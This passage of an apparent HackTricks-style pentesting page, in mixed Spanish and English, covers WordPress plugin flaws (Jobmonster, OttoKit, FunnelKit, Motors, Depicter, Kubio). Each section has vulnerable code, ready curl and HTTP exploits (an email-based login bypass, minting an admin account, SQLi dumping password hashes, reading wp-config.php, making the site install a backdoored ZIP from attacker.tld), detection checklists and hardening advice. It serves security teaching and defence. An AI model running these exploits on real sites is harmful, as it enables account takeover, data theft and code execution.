Muchos themes/plugins incluyen helpers de "social login" expuestos v√≠a admin-ajax.php. Si una acci√≥n AJAX no autenticada (wp_ajax_nopriv_...) conf√≠a en identificadores proporcionados por el cliente cuando faltan los datos del proveedor y luego llama a wp_set_auth_cookie(), esto se convierte en un full authentication bypass.

Patr√≥n t√≠pico defectuoso (simplificado)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Por qu√© es explotable

- Alcanzable sin autenticaci√≥n v√≠a admin-ajax.php (acci√≥n wp_ajax_nopriv_‚Ä¶).
- No hay comprobaciones de nonce/capability antes del cambio de estado.
- Falta verificaci√≥n del provider OAuth/OpenID; la rama por defecto acepta la entrada del atacante.
- get_user_by('email', $_POST['id']) seguido de wp_set_auth_cookie($uid) autentica al solicitante como cualquier direcci√≥n de email existente.

Explotaci√≥n (sin autenticaci√≥n)

- Requisitos previos: el atacante puede acceder a /wp-admin/admin-ajax.php y conoce/adivina un email de usuario v√°lido.
- Establece el provider a un valor no soportado (o om√≠telo) para alcanzar la rama por defecto y pasar id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Some plugins expose REST endpoints that mint reusable ‚Äúconnection keys‚Äù or tokens without verifying the caller‚Äôs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Por qu√© es explotable
- Ruta REST sensible protegida solo por una prueba de identidad de baja entrop√≠a (nombre de usuario/correo electr√≥nico) o por ausencia de permission_callback
- No hay enforcement de capability; la key mintada se acepta como un bypass universal

Lista de comprobaci√≥n de detecci√≥n
- Buscar en el c√≥digo del plugin register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Cualquier ruta que emita tokens/keys basados en una identidad suministrada en la petici√≥n (nombre de usuario/correo electr√≥nico) sin vincularla a un usuario autenticado o a una capability
- Buscar rutas posteriores que acepten el token/key generado sin comprobaciones de capability en el servidor

Endurecimiento
- Para cualquier ruta REST privilegiada: requerir permission_callback que haga cumplir current_user_can() para la capability requerida
- No generar long-lived keys a partir de identidad suministrada por el cliente; si es necesario, emitir tokens de corta duraci√≥n vinculados al usuario tras autenticaci√≥n y volver a comprobar las capabilities al usarlos
- Validar el contexto de usuario del llamante (wp_set_current_user no es suficiente por s√≠ solo) y rechazar solicitudes donde !is_user_logged_in() || !current_user_can(<cap>)

---

## Uso indebido del gate de Nonce ‚Üí instalaci√≥n arbitraria de plugins sin autenticaci√≥n (FunnelKit Automations ‚â§ 3.5.3)

Los Nonces previenen CSRF, no la autorizaci√≥n. Si el c√≥digo interpreta el paso del nonce como luz verde y luego omite comprobaciones de capability para operaciones privilegiadas (p. ej., install/activate plugins), atacantes no autenticados pueden satisfacer un requisito de nonce d√©bil y alcanzar RCE instalando un plugin con backdoor o vulnerable.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: full compromise via arbitrary plugin install/activation

PoC (la forma depende del plugin; solo ilustrativo)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Lista de verificaci√≥n de detecci√≥n
- Manejadores REST/AJAX que modifican plugins/themes con solo wp_verify_nonce()/check_admin_referer() y sin comprobaci√≥n de capacidades
- Cualquier ruta de c√≥digo que establezca $skip_caps = true despu√©s de la validaci√≥n del nonce

Endurecimiento
- Trata siempre los nonces solo como tokens CSRF; aplica las comprobaciones de capacidad independientemente del estado del nonce
- Requerir current_user_can('install_plugins') y current_user_can('activate_plugins') antes de llegar al c√≥digo del instalador
- Rechazar accesos no autenticados; evitar exponer nopriv AJAX actions para flujos privilegiados

### Subscriber+ AJAX plugin installer ‚Üí forced malicious activation (Motors Theme ‚â§ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) mostr√≥ c√≥mo el tema Motors incluye un helper AJAX autenticado para instalar su plugin complementario:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Solo se llama a `check_ajax_referer()`; no hay `current_user_can('install_plugins')` ni `current_user_can('activate_plugins')`.
- El nonce est√° embebido en la p√°gina de administraci√≥n de Motors, por lo que cualquier Subscriber que pueda abrir `/wp-admin/` puede copiarlo desde el HTML/JS.
- El manejador conf√≠a en el par√°metro `plugin` controlado por el atacante (le√≠do de `$_GET`) y lo pasa a `Plugin_Upgrader::install()`, por lo que se descarga un ZIP remoto arbitrario en `wp-content/plugins/`.
- Tras la instalaci√≥n, el tema llama incondicionalmente a `mvl_theme_activate_plugin()`, garantizando la ejecuci√≥n del c√≥digo PHP del plugin atacante.

#### Flujo de explotaci√≥n

1. Registrar/comprometer una cuenta de bajo privilegios (Subscriber es suficiente) y obtener el nonce `mvl_theme_install_base` desde la UI del dashboard de Motors.
2. Crear un ZIP de plugin cuyo directorio de nivel superior coincida con el slug esperado `motors-car-dealership-classified-listings/` e insertar un backdoor o webshell en los puntos de entrada `*.php`.
3. Hospedar el ZIP y activar el instalador apuntando el manejador a tu URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
Debido a que el manejador lee `$_GET['plugin']`, la misma payload tambi√©n puede enviarse v√≠a la query string.

#### Lista de comprobaci√≥n de detecci√≥n

- Buscar en themes/plugins instancias de `Plugin_Upgrader`, `Theme_Upgrader`, o helpers `install_plugin.php` personalizados conectados a hooks `wp_ajax_*` sin comprobaciones de capabilities.
- Inspeccionar cualquier manejador que reciba un par√°metro `plugin`, `package`, `source`, o `url` y lo pase a las APIs del upgrader, especialmente cuando el slug est√° hard-coded pero los contenidos del ZIP no se validan.
- Revisar las p√°ginas de admin que exponen nonces para acciones del instalador‚Äîsi los Subscribers pueden cargar la p√°gina, assume the nonce leaks.

#### Endurecimiento

- Gate installer AJAX callbacks con `current_user_can('install_plugins')` y `current_user_can('activate_plugins')` despu√©s de la verificaci√≥n del nonce; Motors 5.6.82 introdujo esta comprobaci√≥n para parchear el bug.
- Rechazar URLs no confiables: limitar los instaladores a ZIPs incluidos o repositorios de confianza, o aplicar manifiestos de descarga firmados.
- Trata los nonces estrictamente como CSRF tokens; no proporcionan autorizaci√≥n y nunca deber√≠an sustituir las comprobaciones de capabilities.

---

## Unauthenticated SQLi via s (search) parameter in depicter-* actions (Depicter Slider ‚â§ 3.6.1)

M√∫ltiples acciones depicter-* consum√≠an el par√°metro s (search) y lo concatenaban en consultas SQL sin parametrizaci√≥n.

- Par√°metro: s (search)
- Fallo: concatenaci√≥n directa de cadenas en cl√°usulas WHERE/LIKE; sin sentencias preparadas/saneamiento
- Impacto: exfiltraci√≥n de la base de datos (users, hashes), movimiento lateral

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and el uso directo de $_GET['s'] or $_POST['s'] en SQL
- Revisar consultas personalizadas pasadas a $wpdb->get_results()/query() que concatenen s

Hardening
- Siempre usar $wpdb->prepare() or wpdb placeholders; rechazar metacaracteres inesperados del lado del servidor
- A√±adir una lista estricta de permitidos para s y normalizar al conjunto de caracteres/longitud esperados

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

Aceptar rutas controladas por el atacante en un par√°metro de template sin normalizaci√≥n/contenci√≥n permite leer archivos locales arbitrarios, y a veces ejecuci√≥n de c√≥digo si se incluyen en tiempo de ejecuci√≥n archivos PHP/log que sean includable.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC ‚Äì read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Lista de verificaci√≥n de detecci√≥n
- Cualquier handler que concatene rutas de solicitud en sinks include()/require()/read sin confinamiento mediante realpath()
- Buscar patrones de traversal (../) que lleguen fuera del directorio de templates previsto

Endurecimiento
- Aplicar plantillas permitidas; resolver con realpath() y requerir str_starts_with(realpath(file), realpath(allowed_base))
- Normalizar la entrada; rechazar secuencias de traversal y rutas absolutas; usar sanitize_file_name() solo para nombres de archivo (no rutas completas)


## Referencias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
